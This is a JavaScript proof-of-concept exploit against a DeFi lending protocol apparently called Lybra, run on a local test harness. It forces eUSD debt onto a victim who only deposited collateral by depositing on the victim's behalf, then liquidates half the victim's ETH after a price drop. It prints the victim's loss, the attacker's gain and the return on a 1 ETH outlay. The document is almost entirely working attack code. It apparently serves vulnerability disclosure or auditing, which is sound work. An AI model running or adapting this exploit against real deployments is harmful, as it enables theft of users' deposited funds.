const { setup, E, addr } = require('./harness');
const n = x => (Number(x * 100n / E) / 100).toLocaleString(undefined, { maximumFractionDigits: 2 });

// Exact P&L of the full chain for a victim who ONLY ever deposited collateral.
// Control run: identical price path, no attack. Difference = value actually taken from the victim.
async function run(attack) {
  const t = await setup({ price: 2000n * E });
  const ATT = addr(0xA77), VIC = addr(0x1C7), FILL = addr(0xF11);
  for (const a of [ATT, VIC, FILL]) await t.fund(a, 10n ** 25n);
  await t.depositEther(FILL, FILL, 50000n * E, 200n * E);      // some circulation must exist
  await t.depositEther(VIC, VIC, 0, 500n * E);                 // victim: 500 ETH, ZERO debt, never mints

  if (attack) {
    const m = ((await t.deposited(VIC)) * (await t.price()) * 100n) / (160n * E);
    await t.depositEther(ATT, VIC, m, 1n * E);                 // force to the 160% floor for 1 ETH
  }
  await t.setPrice(1870n * E);                                 // routine -6.5% move
  const attStart = await t.stBal(ATT), attEusdStart = await t.eusdBal(ATT);
  if (attack) {
    await t.depositEther(ATT, ATT, 2000000n * E, 15000n * E);  // fund own provider position
    await t.approveEUSD(ATT, t.lybra, 1n << 200n);
    const base = await t.stBal(ATT), baseE = await t.eusdBal(ATT);
    await t.liquidate(ATT, ATT, VIC, (await t.deposited(VIC)) / 2n);
    var attGain = ((await t.stBal(ATT)) - base) * 1870n - (baseE - (await t.eusdBal(ATT)));
  }
  // victim net worth in USD: collateral + eUSD held - debt
  const net = (await t.deposited(VIC)) * 1870n + (await t.eusdBal(VIC)) - (await t.borrowed(VIC));
  return { net, attGain: attGain || 0n, dep: await t.deposited(VIC), debt: await t.borrowed(VIC), eusd: await t.eusdBal(VIC) };
}

(async () => {
  const ctrl = await run(false), atk = await run(true);
  console.log('Victim: deposited 500 ETH as collateral, never minted, never approved anything.\n');
  console.log('CONTROL (same -6.5% price path, no attack):');
  console.log('   collateral', n(ctrl.dep), 'ETH   debt', n(ctrl.debt), '   eUSD held', n(ctrl.eusd));
  console.log('   victim net worth @ $1870: $' + n(ctrl.net));
  console.log('\nATTACKED (force-mint for 1 ETH, then liquidate 50% after the same -6.5% move):');
  console.log('   collateral', n(atk.dep), 'ETH   debt', n(atk.debt), '   eUSD held', n(atk.eusd));
  console.log('   victim net worth @ $1870: $' + n(atk.net));
  console.log('\n   VICTIM LOSS          : $' + n(ctrl.net - atk.net));
  console.log('   ATTACKER GAIN        : $' + n(atk.attGain), '  (outlay: 1 ETH = $2,000)');
  console.log('   return on the 1 ETH  : ' + (Number(atk.attGain / E) / 2000).toFixed(1) + 'x');
  console.log('\n   The victim never opted into debt, never approved a spender, and had');
  console.log('   ZERO liquidation exposure before the attack created it.');
})().catch(e => { console.error('ERR', e.message); process.exit(1); });
